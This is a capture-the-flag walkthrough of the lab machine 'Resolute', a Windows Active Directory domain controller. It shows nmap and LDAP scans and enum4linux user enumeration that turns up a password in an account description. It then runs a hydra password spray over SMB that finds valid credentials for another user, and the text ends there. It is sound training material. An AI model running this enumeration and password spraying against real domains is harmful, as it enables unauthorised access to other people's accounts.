
# Resolute 
<br/>

![info](https://github.com/VitthalS/VitthalS.github.io/raw/master/writeups/resolute/info.png)

<br/>
Resolute was retired. It's a very easy Windows box with enumeration of common ports and gaining access to machine via founded creds, Again enumerating for secoond user creds. I'll show how to exploit if the User is in DNSAdmin group and to gain Domain Admin privs, So let's get started start ...<br/>

## Reconnaissance

Run the [nmapAutomator](https://github.com/21y4d/nmapAutomator) script to enumerate open ports and services running on those ports.

`nmapAutomator.sh 10.10.10.169 All`

All: Runs all the scans consecutively.
We get back the following result.

```
Running all scans on 10.10.10.169

Host is likely running Windows



---------------------Starting Nmap Quick Scan---------------------

Starting Nmap 7.80 ( https://nmap.org ) at 2020-05-05 19:03 IST
Nmap scan report for 10.10.10.169
Host is up (0.16s latency).
Not shown: 989 closed ports
PORT     STATE SERVICE
53/tcp   open  domain
88/tcp   open  kerberos-sec
135/tcp  open  msrpc
139/tcp  open  netbios-ssn
389/tcp  open  ldap
445/tcp  open  microsoft-ds
464/tcp  open  kpasswd5
593/tcp  open  http-rpc-epmap
636/tcp  open  ldapssl
3268/tcp open  globalcatLDAP
3269/tcp open  globalcatLDAPssl

Nmap done: 1 IP address (1 host up) scanned in 8.40 seconds



---------------------Starting Nmap Basic Scan---------------------

Starting Nmap 7.80 ( https://nmap.org ) at 2020-05-05 19:03 IST
Nmap scan report for 10.10.10.169
Host is up (0.16s latency).

PORT     STATE SERVICE      VERSION
53/tcp   open  domain?
| fingerprint-strings: 
|   DNSVersionBindReqTCP: 
|     version
|_    bind
88/tcp   open  kerberos-sec Microsoft Windows Kerberos (server time: 2020-05-05 13:39:15Z)
135/tcp  open  msrpc        Microsoft Windows RPC
139/tcp  open  netbios-ssn  Microsoft Windows netbios-ssn
389/tcp  open  ldap         Microsoft Windows Active Directory LDAP (Domain: megabank.local, Site: Default-First-Site-Name)
445/tcp  open  microsoft-ds Windows Server 2016 Standard 14393 microsoft-ds (workgroup: MEGABANK)
464/tcp  open  kpasswd5?
593/tcp  open  ncacn_http   Microsoft Windows RPC over HTTP 1.0
636/tcp  open  tcpwrapped
3268/tcp open  ldap         Microsoft Windows Active Directory LDAP (Domain: megabank.local, Site: Default-First-Site-Name)
3269/tcp open  tcpwrapped
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port53-TCP:V=7.80%I=7%D=5/5%Time=5EB16B3C%P=x86_64-pc-linux-gnu%r(DNSVe
SF:rsionBindReqTCP,20,"\0\x1e\0\x06\x81\x04\0\x01\0\0\0\0\0\0\x07version\x
SF:04bind\0\0\x10\0\x03");
Service Info: Host: RESOLUTE; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
|_clock-skew: mean: 2h25m32s, deviation: 4h02m30s, median: 5m31s
| smb-os-discovery: 
|   OS: Windows Server 2016 Standard 14393 (Windows Server 2016 Standard 6.3)
|   Computer name: Resolute
|   NetBIOS computer name: RESOLUTE\x00
|   Domain name: megabank.local
|   Forest name: megabank.local
|   FQDN: Resolute.megabank.local
|_  System time: 2020-05-05T06:40:05-07:00
| smb-security-mode: 
|   account_used: <blank>
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: required
| smb2-security-mode: 
|   2.02: 
|_    Message signing enabled and required
| smb2-time: 
|   date: 2020-05-05T13:40:06
|_  start_date: 2020-05-05T13:37:58

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 191.67 seconds



----------------------Starting Nmap UDP Scan----------------------

Starting Nmap 7.80 ( https://nmap.org ) at 2020-05-05 19:06 IST
Warning: 10.10.10.169 giving up on port because retransmission cap hit (1).
Nmap scan report for 10.10.10.169
Host is up (0.15s latency).
Not shown: 827 open|filtered ports, 167 closed ports
PORT      STATE SERVICE
123/udp   open  ntp
389/udp   open  ldap
52225/udp open  unknown
61961/udp open  unknown
62699/udp open  unknown
64590/udp open  unknown

Nmap done: 1 IP address (1 host up) scanned in 168.14 seconds


Making a script scan on UDP ports: 123, 389, 52225, 61961, 62699, 64590

Starting Nmap 7.80 ( https://nmap.org ) at 2020-05-05 19:09 IST
Nmap scan report for 10.10.10.169
Host is up (0.15s latency).

PORT      STATE  SERVICE VERSION
123/udp   open   ntp     NTP v3
389/udp   open   ldap    Microsoft Windows Active Directory LDAP (Domain: megabank.local, Site: Default-First-Site-Name)
52225/udp closed unknown
61961/udp open   domain  (generic dns response: SERVFAIL)
| fingerprint-strings: 
|   NBTStat: 
|_    CKAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
62699/udp open   domain  (generic dns response: SERVFAIL)
| fingerprint-strings: 
|   NBTStat: 
|_    CKAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
64590/udp closed unknown
2 services unrecognized despite returning data. If you know the service/version, please submit the following fingerprints at https://nmap.org/cgi-bin/submit.cgi?new-service :
==============NEXT SERVICE FINGERPRINT (SUBMIT INDIVIDUALLY)==============
SF-Port61961-UDP:V=7.80%I=7%D=5/5%Time=5EB16CB0%P=x86_64-pc-linux-gnu%r(NB
SF:TStat,32,"\x80\xf0\x80\x82\0\x01\0\0\0\0\0\0\x20CKAAAAAAAAAAAAAAAAAAAAA
SF:AAAAAAAAA\0\0!\0\x01");
==============NEXT SERVICE FINGERPRINT (SUBMIT INDIVIDUALLY)==============
SF-Port62699-UDP:V=7.80%I=7%D=5/5%Time=5EB16CB0%P=x86_64-pc-linux-gnu%r(NB
SF:TStat,32,"\x80\xf0\x80\x82\0\x01\0\0\0\0\0\0\x20CKAAAAAAAAAAAAAAAAAAAAA
SF:AAAAAAAAA\0\0!\0\x01");
Service Info: Host: RESOLUTE; OS: Windows; CPE: cpe:/o:microsoft:windows

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 25.23 seconds



---------------------Starting Nmap Full Scan----------------------

Starting Nmap 7.80 ( https://nmap.org ) at 2020-05-05 19:10 IST
Initiating Parallel DNS resolution of 1 host. at 19:10
Completed Parallel DNS resolution of 1 host. at 19:10, 0.00s elapsed
Initiating SYN Stealth Scan at 19:10
Scanning 10.10.10.169 [65535 ports]
Discovered open port 445/tcp on 10.10.10.169
Discovered open port 139/tcp on 10.10.10.169
Discovered open port 53/tcp on 10.10.10.169
Discovered open port 135/tcp on 10.10.10.169
Warning: 10.10.10.169 giving up on port because retransmission cap hit (1).
SYN Stealth Scan Timing: About 18.58% done; ETC: 19:12 (0:02:16 remaining)
Discovered open port 636/tcp on 10.10.10.169
Discovered open port 49665/tcp on 10.10.10.169
SYN Stealth Scan Timing: About 38.68% done; ETC: 19:13 (0:01:56 remaining)
Discovered open port 88/tcp on 10.10.10.169
SYN Stealth Scan Timing: About 54.90% done; ETC: 19:13 (0:01:25 remaining)
Discovered open port 50056/tcp on 10.10.10.169
Discovered open port 49676/tcp on 10.10.10.169
Discovered open port 49667/tcp on 10.10.10.169
Discovered open port 49712/tcp on 10.10.10.169
Discovered open port 49666/tcp on 10.10.10.169
SYN Stealth Scan Timing: About 67.38% done; ETC: 19:13 (0:01:04 remaining)
Discovered open port 3268/tcp on 10.10.10.169
Discovered open port 49688/tcp on 10.10.10.169
Discovered open port 49669/tcp on 10.10.10.169
Discovered open port 50100/tcp on 10.10.10.169
Discovered open port 9389/tcp on 10.10.10.169
SYN Stealth Scan Timing: About 78.53% done; ETC: 19:14 (0:00:54 remaining)
Discovered open port 5985/tcp on 10.10.10.169
SYN Stealth Scan Timing: About 84.36% done; ETC: 19:15 (0:00:47 remaining)
Discovered open port 389/tcp on 10.10.10.169
SYN Stealth Scan Timing: About 88.93% done; ETC: 19:15 (0:00:37 remaining)
Discovered open port 464/tcp on 10.10.10.169
Discovered open port 3269/tcp on 10.10.10.169
Discovered open port 49677/tcp on 10.10.10.169
Discovered open port 47001/tcp on 10.10.10.169
Discovered open port 593/tcp on 10.10.10.169
Discovered open port 49664/tcp on 10.10.10.169
Completed SYN Stealth Scan at 19:17, 445.58s elapsed (65535 total ports)
Nmap scan report for 10.10.10.169
Host is up (0.16s latency).
Not shown: 65463 closed ports
PORT      STATE    SERVICE
53/tcp    open     domain
88/tcp    open     kerberos-sec
135/tcp   open     msrpc
139/tcp   open     netbios-ssn
389/tcp   open     ldap
445/tcp   open     microsoft-ds
464/tcp   open     kpasswd5
593/tcp   open     http-rpc-epmap
636/tcp   open     ldapssl
1525/tcp  filtered orasrv
2154/tcp  filtered stdptc
3168/tcp  filtered poweronnud
3268/tcp  open     globalcatLDAP
3269/tcp  open     globalcatLDAPssl
3918/tcp  filtered pktcablemmcops
5698/tcp  filtered unknown
5985/tcp  open     wsman
7226/tcp  filtered unknown
7487/tcp  filtered unknown
7779/tcp  filtered vstat
9389/tcp  open     adws
10038/tcp filtered unknown
12089/tcp filtered unknown
12824/tcp filtered unknown
13219/tcp filtered unknown
13727/tcp filtered unknown
13989/tcp filtered unknown
14175/tcp filtered unknown
14343/tcp filtered unknown
17262/tcp filtered unknown
21709/tcp filtered unknown
23410/tcp filtered unknown
25649/tcp filtered unknown
26850/tcp filtered unknown
27482/tcp filtered unknown
31779/tcp filtered unknown
32947/tcp filtered unknown
33925/tcp filtered unknown
34225/tcp filtered unknown
35137/tcp filtered unknown
35196/tcp filtered unknown
35927/tcp filtered unknown
36785/tcp filtered unknown
37829/tcp filtered unknown
38939/tcp filtered unknown
40467/tcp filtered unknown
43203/tcp filtered unknown
44300/tcp filtered unknown
47001/tcp open     winrm
47906/tcp filtered unknown
48217/tcp filtered unknown
48511/tcp filtered unknown
49664/tcp open     unknown
49665/tcp open     unknown
49666/tcp open     unknown
49667/tcp open     unknown
49669/tcp open     unknown
49676/tcp open     unknown
49677/tcp open     unknown
49688/tcp open     unknown
49712/tcp open     unknown
50056/tcp open     unknown
50100/tcp open     unknown
51840/tcp filtered unknown
53485/tcp filtered unknown
54727/tcp filtered unknown
57381/tcp filtered unknown
58138/tcp filtered unknown
59339/tcp filtered unknown
63264/tcp filtered unknown
63395/tcp filtered unknown
65182/tcp filtered unknown

Read data files from: /usr/bin/../share/nmap
Nmap done: 1 IP address (1 host up) scanned in 445.73 seconds
           Raw packets sent: 73743 (3.245MB) | Rcvd: 73508 (2.940MB)

---------------------Finished all Nmap scans---------------------

root@kali:~/htb/resolute$ 
```


We have 23 ports open.

- **Port 53 :** running DNS
- **Port 88:** running Microsoft Windows Kerberos
- **Ports 139 & 445:** running SMB
- **Ports 389 & 3268:** running Microsoft Windows Active Directory LDAP
- **Port 464:** running kpasswd5
- **Ports 593 & 49676:** running ncacn_http
- **Ports 636 & 3269:** running tcpwrapped
- **Port 9389 :** running .NET Message Framing
- **Ports 5985 & 47001 :** running Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
- **Ports 135,49664,49665,49666,49667,49669,49677,49688,49712:** running Microsoft Windows RPC

Before we move on to enumeration, let’s observe the scan results.

- Since the Kerberos and LDAP services are running, chances are we’re dealing with a Windows Active Directory box.
- The nmap scan leaks the domain and hostname: megabank.local. Similarly, the SMB OS nmap scan leaks the operating system: Windows Server 2016 Standard 14393 (Windows Server 2016 Standard 6.3).
- Port 389 is running LDAP. We’ll need to query it for any useful information. Same goes for SMB.
- If we find credentials through SMB or LDAP, we can use these services to remotely connect to the box.

## Enumeration

We’ll start off with enumerating LDAP.

**Port 389 LDAP**

Nmap has an NSE script that enumerates LDAP.

```
root@kali:# locate ldap-search /usr/share/nmap/scripts/ldap-search.nse
```

Let’s run the script on port 389.

```
root@kali:~/htb$ nmap -p 389 --script ldap-search 10.10.10.169
Starting Nmap 7.80 ( https://nmap.org ) at 2020-05-06 18:32 IST
Nmap scan report for 10.10.10.169
Host is up (0.18s latency).

PORT    STATE SERVICE
389/tcp open  ldap
| ldap-search: 
|   Context: DC=megabank,DC=local
|     dn: DC=megabank,DC=local
|         objectClass: top
|         objectClass: domain
|         objectClass: domainDNS
|         distinguishedName: DC=megabank,DC=local
|         instanceType: 5
|         whenCreated: 2019/09/25 13:28:22 UTC
|         whenChanged: 2020/05/06 12:30:32 UTC
|         subRefs: DC=ForestDnsZones,DC=megabank,DC=local
|         subRefs: DC=DomainDnsZones,DC=megabank,DC=local
|         subRefs: CN=Configuration,DC=megabank,DC=local
|         uSNCreated: 4099
|         \x19\x9A\xF2\xBC
|         uSNChanged: 147500
|         name: megabank
|         objectGUID: b4e0e946-e7cb-b742-8fa0-5c4cec2fe5aa
|         replUpToDateVector: \x02\x00\x00\x00\x00\x00\x00\x00\x15\x00\x00\x00\x00\x00\x00\x00;\xFE\xC7\x0EMO\x9F@\x81\xB6~\xC4\x91\xD3R\x8C\x1A\xC0\x01\x00\x00\x00\x00\x00\x0Cs\xF7\x13\x03\x00\x00\x00\xC2\x1D)\x1D\xC8\x1B\xD9G\xA2\xBCRK\xE1\x0F\x10d\x08\xA0\x00\x00\x00\x00\x00\x00\x115\x9F\x13\x03\x00\x00\x00p\x11cD\x9C\x9F\xC9N\xA6k\<\xDE\xBB\xAB|\x1C\xE0\x01\x00\x00\x00\x00\x00F{\xF7\x13\x03\x00\x00\x00\xAA8\x88adCkM\xB6\xD63\x9EGMk\xC8\x07\x90\x00\x00\x00\x00\x00\x00Z0\x9F\x13\x03\x00\x00\x00\x05\xA2\xB2b\xFB)\x86A\xB05\xFD\xBE\x97\xF4\xCEq  \xB0\x00\x00\x00\x00\x00\x00\xD07\x9F\x13\x03\x00\x00\x00`\x9D\x0Ee\xB3T\xBDE\xB4g\x88\x07\x05\xFCI\xE1\x05p\x00\x00\x00\x00\x00\x00< \x9F\x13\x03\x00\x00\x00\xD9
|         cjy\xA3\xC2I\x89d\xE1om\x86\xB0Y\x1F\x10\x02\x00\x00\x00\x00\x00\xF1.\xF8\x13\x03\x00\x00\x0068\xC9\x82\x1E\xBD\xD2N\x92\x1CL\xAF\xF2=\xC6o\x0C\xE0\x00\x00\x00\x00\x00\x00@\x1F\xE6\x13\x03\x00\x00\x00\x11:\x85\x83#\x98\xDAJ\xAA\x83\xE6\xF7%{w\xC1\x18\xA0\x01\x00\x00\x00\x00\x00
|         i\xF7\x13\x03\x00\x00\x00\xD0\xBBK\x8B\xF5\xB5\xD5D\xBE\xF9\xD7\x92\xCEz?;\x1B\xD0\x01\x00\x00\x00\x00\x00vw\xF7\x13\x03\x00\x00\x00
|         n\xF7\x13\x03\x00\x00\x00%}:\xF7\xE0\xF6\xEFM\xB2\xE2\xDD\x80.\xF0*\xB3\x17\x90\x01\x00\x00\x00\x00\x00\xBB`\xF7\x13\x03\x00\x00\x00\xF90\xC0\xFF\x9Df\xB6K\x939WR\x81\xC5P\xA6\x1E\x00\x02\x00\x00\x00\x00\x00\x07\x1D\xF8\x13\x03\x00\x00\x00
|         creationTime: 132332418321584084
|         forceLogoff: -9223372036854775808
|         lockoutDuration: -18000000000
|         lockOutObservationWindow: -18000000000
|         lockoutThreshold: 0
|         maxPwdAge: -9223372036854775808
|         minPwdAge: -864000000000
|         minPwdLength: 7
|         modifiedCountAtLastProm: 0
|         nextRid: 1000
|         pwdProperties: 0
|         pwdHistoryLength: 24
|         objectSid: 1-5-21-1392959593-3013219662-3596683436
|         serverState: 1
|         uASCompat: 1
|         modifiedCount: 1
|         auditingPolicy: \x00\x01
|         nTMixedDomain: 0
|         rIDManagerReference: CN=RID Manager$,CN=System,DC=megabank,DC=local
|         fSMORoleOwner: CN=NTDS Settings,CN=RESOLUTE,CN=Servers,CN=Default-First-Site-Name,CN=Sites,CN=Configuration,DC=megabank,DC=local
|         systemFlags: -1946157056
|         wellKnownObjects: B:32:6227F0AF1FC2410D8E3BB10615BB5B0F:CN=NTDS Quotas,DC=megabank,DC=local
|         wellKnownObjects: B:32:F4BE92A4C777485E878E9421D53087DB:CN=Microsoft,CN=Program Data,DC=megabank,DC=local
|         wellKnownObjects: B:32:09460C08AE1E4A4EA0F64AEE7DAA1E5A:CN=Program Data,DC=megabank,DC=local
|         wellKnownObjects: B:32:22B70C67D56E4EFB91E9300FCA3DC1AA:CN=ForeignSecurityPrincipals,DC=megabank,DC=local
|         wellKnownObjects: B:32:18E2EA80684F11D2B9AA00C04F79F805:CN=Deleted Objects,DC=megabank,DC=local
|         wellKnownObjects: B:32:2FBAC1870ADE11D297C400C04FD8D5CD:CN=Infrastructure,DC=megabank,DC=local
|         wellKnownObjects: B:32:AB8153B7768811D1ADED00C04FD8D5CD:CN=LostAndFound,DC=megabank,DC=local
|         wellKnownObjects: B:32:AB1D30F3768811D1ADED00C04FD8D5CD:CN=System,DC=megabank,DC=local
|         wellKnownObjects: B:32:A361B2FFFFD211D1AA4B00C04FD7D83A:OU=Domain Controllers,DC=megabank,DC=local
|         wellKnownObjects: B:32:AA312825768811D1ADED00C04FD8D5CD:CN=Computers,DC=megabank,DC=local
|         wellKnownObjects: B:32:A9D1CA15768811D1ADED00C04FD8D5CD:CN=Users,DC=megabank,DC=local
|         objectCategory: CN=Domain-DNS,CN=Schema,CN=Configuration,DC=megabank,DC=local
|         isCriticalSystemObject: TRUE
|         gPLink: [LDAP://CN={31B2F340-016D-11D2-945F-00C04FB984F9},CN=Policies,CN=System,DC=megabank,DC=local;0]
|         dSCorePropagationData: 1601/01/01 00:00:00 UTC
|         otherWellKnownObjects: B:32:683A24E2E8164BD3AF86AC3C2CF3F981:CN=Keys,DC=megabank,DC=local
|         otherWellKnownObjects: B:32:1EB93889E40C45DF9F0C64D23BBB6237:CN=Managed Service Accounts,DC=megabank,DC=local
|         masteredBy: CN=NTDS Settings,CN=RESOLUTE,CN=Servers,CN=Default-First-Site-Name,CN=Sites,CN=Configuration,DC=megabank,DC=local
|         ms-DS-MachineAccountQuota: 10
|         msDS-Behavior-Version: 7
|         msDS-PerUserTrustQuota: 1
|         msDS-AllUsersTrustQuota: 1000
|         msDS-PerUserTrustTombstonesQuota: 10
|         msDs-masteredBy: CN=NTDS Settings,CN=RESOLUTE,CN=Servers,CN=Default-First-Site-Name,CN=Sites,CN=Configuration,DC=megabank,DC=local
|         msDS-IsDomainFor: CN=NTDS Settings,CN=RESOLUTE,CN=Servers,CN=Default-First-Site-Name,CN=Sites,CN=Configuration,DC=megabank,DC=local
|         msDS-NcType: 0
|         msDS-ExpirePasswordsOnSmartCardOnlyAccounts: TRUE
|         dc: megabank
|     dn: CN=Users,DC=megabank,DC=local
|         objectClass: top
|         objectClass: container
|         cn: Users
|         description: Default container for upgraded user accounts
|         distinguishedName: CN=Users,DC=megabank,DC=local
|         instanceType: 4
|         whenCreated: 2019/09/25 13:28:31 UTC
|         whenChanged: 2019/09/25 13:28:31 UTC
|         uSNCreated: 5888
|         uSNChanged: 5888
|         showInAdvancedViewOnly: FALSE
|         name: Users
|         objectGUID: d0ed52a-e080-9841-81d6-302cdfab7cf
|         systemFlags: -1946157056
|         objectCategory: CN=Container,CN=Schema,CN=Configuration,DC=megabank,DC=local
|         isCriticalSystemObject: TRUE
|         dSCorePropagationData: 2019/09/27 22:10:48 UTC
|         dSCorePropagationData: 2019/09/27 10:52:19 UTC
|         dSCorePropagationData: 2019/09/26 12:35:01 UTC
|         dSCorePropagationData: 2019/09/25 13:29:12 UTC
|         dSCorePropagationData: 1601/07/14 04:24:33 UTC
|     dn: CN=Computers,DC=megabank,DC=local
|         objectClass: top
|         objectClass: container
|         cn: Computers
|         description: Default container for upgraded computer accounts
|         distinguishedName: CN=Computers,DC=megabank,DC=local
|         instanceType: 4
|         whenCreated: 2019/09/25 13:28:31 UTC
|         whenChanged: 2019/09/25 13:28:31 UTC
|         uSNCreated: 5889
|         uSNChanged: 5889
|         showInAdvancedViewOnly: FALSE
|         name: Computers
|         objectGUID: 41e2c5ff-1512-be45-9ca1-488358ad588
|         systemFlags: -1946157056
|         objectCategory: CN=Container,CN=Schema,CN=Configuration,DC=megabank,DC=local
|         isCriticalSystemObject: TRUE
|         dSCorePropagationData: 2019/09/27 22:10:48 UTC
|         dSCorePropagationData: 2019/09/27 10:52:18 UTC
|         dSCorePropagationData: 2019/09/26 12:35:01 UTC
|         dSCorePropagationData: 2019/09/25 13:29:12 UTC
|         dSCorePropagationData: 1601/07/14 04:24:33 UTC
|     dn: OU=Domain Controllers,DC=megabank,DC=local
|         objectClass: top
|         objectClass: organizationalUnit
|         ou: Domain Controllers
|         description: Default container for domain controllers
|         distinguishedName: OU=Domain Controllers,DC=megabank,DC=local
|         instanceType: 4
|         whenCreated: 2019/09/25 13:28:31 UTC
|         whenChanged: 2019/09/25 13:28:31 UTC
|         uSNCreated: 6031
|         uSNChanged: 6031
|         showInAdvancedViewOnly: FALSE
|         name: Domain Controllers
|         objectGUID: 12316bd2-27fe-3a41-90d0-471b6f5e7497
|         systemFlags: -1946157056
|         objectCategory: CN=Organizational-Unit,CN=Schema,CN=Configuration,DC=megabank,DC=local
|         isCriticalSystemObject: TRUE
|         gPLink: [LDAP://CN={6AC1786C-016F-11D2-945F-00C04fB984F9},CN=Policies,CN=System,DC=megabank,DC=local;0]
|         dSCorePropagationData: 2019/09/27 22:10:48 UTC
|         dSCorePropagationData: 2019/09/27 10:52:18 UTC
|         dSCorePropagationData: 2019/09/26 12:35:01 UTC
|         dSCorePropagationData: 2019/09/25 13:29:12 UTC
|         dSCorePropagationData: 1601/07/14 04:24:33 UTC
|     dn: CN=System,DC=megabank,DC=local
|         objectClass: top
|         objectClass: container
|         cn: System
|         description: Builtin system settings
|         distinguishedName: CN=System,DC=megabank,DC=local
|         instanceType: 4
|         whenCreated: 2019/09/25 13:28:31 UTC
|         whenChanged: 2019/09/25 13:28:31 UTC
|         uSNCreated: 5890
|         uSNChanged: 5890
|         showInAdvancedViewOnly: TRUE
|         name: System
|         objectGUID: 40f9d21f-49e-f54f-bf31-ad83fbc454
|         systemFlags: -1946157056
|         objectCategory: CN=Container,CN=Schema,CN=Configuration,DC=megabank,DC=local
|         isCriticalSystemObject: TRUE
|         dSCorePropagationData: 2019/09/27 22:10:48 UTC
|         dSCorePropagationData: 2019/09/27 10:52:18 UTC
|         dSCorePropagationData: 2019/09/26 12:35:01 UTC
|         dSCorePropagationData: 2019/09/25 13:29:12 UTC
|         dSCorePropagationData: 1601/07/14 04:24:33 UTC
|     dn: CN=LostAndFound,DC=megabank,DC=local
|         objectClass: top
|         objectClass: lostAndFound
|         cn: LostAndFound
|         description: Default container for orphaned objects
|         distinguishedName: CN=LostAndFound,DC=megabank,DC=local
|         instanceType: 4
|         whenCreated: 2019/09/25 13:28:31 UTC
|         whenChanged: 2019/09/25 13:28:31 UTC
|         uSNCreated: 5886
|         uSNChanged: 5886
|         showInAdvancedViewOnly: TRUE
|         name: LostAndFound
|         objectGUID: f0581973-33c1-5a4b-aeff-69c8231b4c20
|         systemFlags: -1946157056
|         objectCategory: CN=Lost-And-Found,CN=Schema,CN=Configuration,DC=megabank,DC=local
|         isCriticalSystemObject: TRUE
|         dSCorePropagationData: 2019/09/27 22:10:48 UTC
|         dSCorePropagationData: 2019/09/27 10:52:18 UTC
|         dSCorePropagationData: 2019/09/26 12:35:01 UTC
|         dSCorePropagationData: 2019/09/25 13:29:12 UTC
|         dSCorePropagationData: 1601/07/14 04:24:33 UTC
|     dn: CN=Infrastructure,DC=megabank,DC=local
|         objectClass: top
|         objectClass: infrastructureUpdate
|         cn: Infrastructure

.......
```

We get a bunch of results, which I have truncated. I’m going to enumerate other ports to see if I can get names from there.

We’ll run enum4linux which is a tool for enumerating information from Windows and Samba systems. It’s a wrapper around the Samba tools smbclient, rpclient, net and nmblookup. With special configuration, you can even have it query LDAP.

`enum4linux 10.10.10.169 > enum4linux-results.txt`

We get a list of domain users.

```
[+] Getting domain group memberships:
Group 'Group Policy Creator Owners' (RID: 520) has member: MEGABANK\Administrator
Group 'Domain Admins' (RID: 512) has member: MEGABANK\Administrator
Group 'Domain Guests' (RID: 514) has member: MEGABANK\Guest
Group 'Domain Computers' (RID: 515) has member: MEGABANK\MS02$
Group 'Domain Controllers' (RID: 516) has member: MEGABANK\RESOLUTE$
Group 'Enterprise Admins' (RID: 519) has member: MEGABANK\Administrator
Group 'Schema Admins' (RID: 518) has member: MEGABANK\Administrator
Group 'Contractors' (RID: 1103) has member: MEGABANK\ryan
Group 'Domain Users' (RID: 513) has member: MEGABANK\Administrator
Group 'Domain Users' (RID: 513) has member: MEGABANK\DefaultAccount
Group 'Domain Users' (RID: 513) has member: MEGABANK\krbtgt
Group 'Domain Users' (RID: 513) has member: MEGABANK\ryan
Group 'Domain Users' (RID: 513) has member: MEGABANK\marko
Group 'Domain Users' (RID: 513) has member: MEGABANK\sunita
Group 'Domain Users' (RID: 513) has member: MEGABANK\abigail
Group 'Domain Users' (RID: 513) has member: MEGABANK\marcus
Group 'Domain Users' (RID: 513) has member: MEGABANK\sally
Group 'Domain Users' (RID: 513) has member: MEGABANK\fred
Group 'Domain Users' (RID: 513) has member: MEGABANK\angela
Group 'Domain Users' (RID: 513) has member: MEGABANK\felicia
Group 'Domain Users' (RID: 513) has member: MEGABANK\gustavo
Group 'Domain Users' (RID: 513) has member: MEGABANK\ulf
Group 'Domain Users' (RID: 513) has member: MEGABANK\stevie
Group 'Domain Users' (RID: 513) has member: MEGABANK\claire
Group 'Domain Users' (RID: 513) has member: MEGABANK\paulo
Group 'Domain Users' (RID: 513) has member: MEGABANK\steve
Group 'Domain Users' (RID: 513) has member: MEGABANK\annette
Group 'Domain Users' (RID: 513) has member: MEGABANK\annika
Group 'Domain Users' (RID: 513) has member: MEGABANK\per
Group 'Domain Users' (RID: 513) has member: MEGABANK\claude
Group 'Domain Users' (RID: 513) has member: MEGABANK\melanie
Group 'Domain Users' (RID: 513) has member: MEGABANK\zach
Group 'Domain Users' (RID: 513) has member: MEGABANK\simon
Group 'Domain Users' (RID: 513) has member: MEGABANK\naoki
```

Take the above usernames and save them in the file users.txt.

```
root@kali:~/htb/resolute$ cat users.txt 
Administrator
Guest
krbtgt
DefaultAccount
ryan
marko
sunita
abigail
marcus
sally
fred
angela
felicia
gustavo
ulf
stevie
claire
paulo
steve
annette
annika
per
claude
melanie
zach
simon
naoki
```

Also I got the interesting result for `marko` user in the description `Account created. Password set to Welcome123!` which discloses the password of newly created user.

```
 ============================= 
|    Users on 10.10.10.169    |
 ============================= 
index: 0x10b0 RID: 0x19ca acb: 0x00000010 Account: abigail  Name: (null)    Desc: (null)
index: 0xfbc RID: 0x1f4 acb: 0x00000210 Account: Administrator  Name: (null)    Desc: Built-in account for administering the computer/domain
index: 0x10b4 RID: 0x19ce acb: 0x00000010 Account: angela   Name: (null)    Desc: (null)
index: 0x10bc RID: 0x19d6 acb: 0x00000010 Account: annette  Name: (null)    Desc: (null)
index: 0x10bd RID: 0x19d7 acb: 0x00000010 Account: annika   Name: (null)    Desc: (null)
index: 0x10b9 RID: 0x19d3 acb: 0x00000010 Account: claire   Name: (null)    Desc: (null)
index: 0x10bf RID: 0x19d9 acb: 0x00000010 Account: claude   Name: (null)    Desc: (null)
index: 0xfbe RID: 0x1f7 acb: 0x00000215 Account: DefaultAccount Name: (null)    Desc: A user account managed by the system.
index: 0x10b5 RID: 0x19cf acb: 0x00000010 Account: felicia  Name: (null)    Desc: (null)
index: 0x10b3 RID: 0x19cd acb: 0x00000010 Account: fred Name: (null)    Desc: (null)
index: 0xfbd RID: 0x1f5 acb: 0x00000215 Account: Guest  Name: (null)    Desc: Built-in account for guest access to the computer/domain
index: 0x10b6 RID: 0x19d0 acb: 0x00000010 Account: gustavo  Name: (null)    Desc: (null)
index: 0xff4 RID: 0x1f6 acb: 0x00000011 Account: krbtgt Name: (null)    Desc: Key Distribution Center Service Account
index: 0x10b1 RID: 0x19cb acb: 0x00000010 Account: marcus   Name: (null)    Desc: (null)
index: 0x10a9 RID: 0x457 acb: 0x00000210 Account: marko Name: Marko Novak   Desc: Account created. Password set to Welcome123!
index: 0x10c0 RID: 0x2775 acb: 0x00000010 Account: melanie  Name: (null)    Desc: (null)
index: 0x10c3 RID: 0x2778 acb: 0x00000010 Account: naoki    Name: (null)    Desc: (null)
index: 0x10ba RID: 0x19d4 acb: 0x00000010 Account: paulo    Name: (null)    Desc: (null)
index: 0x10be RID: 0x19d8 acb: 0x00000010 Account: per  Name: (null)    Desc: (null)
index: 0x10a3 RID: 0x451 acb: 0x00000210 Account: ryan  Name: Ryan Bertrand Desc: (null)
index: 0x10b2 RID: 0x19cc acb: 0x00000010 Account: sally    Name: (null)    Desc: (null)
index: 0x10c2 RID: 0x2777 acb: 0x00000010 Account: simon    Name: (null)    Desc: (null)
index: 0x10bb RID: 0x19d5 acb: 0x00000010 Account: steve    Name: (null)    Desc: (null)
index: 0x10b8 RID: 0x19d2 acb: 0x00000010 Account: stevie   Name: (null)    Desc: (null)
index: 0x10af RID: 0x19c9 acb: 0x00000010 Account: sunita   Name: (null)    Desc: (null)
index: 0x10b7 RID: 0x19d1 acb: 0x00000010 Account: ulf  Name: (null)    Desc: (null)
index: 0x10c1 RID: 0x2776 acb: 0x00000010 Account: zach Name: (null)    Desc: (null)

```


So We have bunch of usernames and one password, Lets check of which user it is.

```
root@kali:~/htb/resolute$ hydra -L users.txt -p Welcome123! 10.10.10.169 smb
Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2020-05-06 20:14:01
[INFO] Reduced number of tasks to 1 (smb does not like parallel connections)
[WARNING] Restorefile (you have 10 seconds to abort... (use option -I to skip waiting)) from a previous session found, to prevent overwriting, ./hydra.restore
[DATA] max 1 task per 1 server, overall 1 task, 27 login tries (l:27/p:1), ~27 tries per task
[DATA] attacking smb://10.10.10.169:445/
[445][smb] host: 10.10.10.169   login: melanie   password: Welcome123!
[STATUS] 25.00 tries/min, 25 tries in 00:01h, 2 to do in 00:01h, 1 active
